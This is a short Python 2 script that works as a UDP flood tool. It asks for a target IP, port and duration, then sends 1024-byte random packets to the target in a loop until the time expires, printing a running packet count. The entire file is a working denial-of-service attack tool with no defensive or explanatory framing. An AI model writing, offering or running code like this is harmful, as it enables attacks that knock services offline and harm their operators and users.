#!/usr/bin/env python


import os, sys, time, socket, random
from colorama import *


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)

os.system("clear")

time.sleep(1)

time.sleep(1)



ip = raw_input(Fore.YELLOW + "[*] Enter Target IP: ")
port = input(Fore.MAGENTA + "[*] Enter Target Port: ")
dur = input(Fore.GREEN + "[*] Enter Duration: ")


timeout = time.time() + int(dur)
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes,(ip, port))
        sent = sent + 1
        print(Fore.GREEN + "[i] " + Fore.YELLOW + "Packages Send %s Packet To %s Over Port %s " %(sent, ip, port))

    except KeyboardInterrupt:
        sys.exit()
